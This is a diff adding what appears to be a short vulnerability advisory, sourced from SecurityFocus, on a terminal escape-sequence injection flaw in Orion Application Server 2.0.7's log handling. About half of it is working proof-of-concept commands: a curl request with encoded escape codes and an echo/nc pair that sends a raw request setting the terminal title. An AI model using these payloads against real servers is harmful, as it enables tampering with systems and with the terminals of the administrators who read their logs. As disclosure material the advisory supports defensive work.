@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/37717/info
+
+Orion Application Server is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in logfiles.
+
+Attackers can exploit this issue to execute arbitrary commands in a terminal.
+
+Orion Application Server 2.0.7 is vulnerable; other versions may also be affected. 
+
+
+curl -kis http://localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a
+
+echo -en "GET /\x1b]2;owned?\x07\x0a\x0d\x0a\x0d" > payload
+nc localhost 80 < payload 
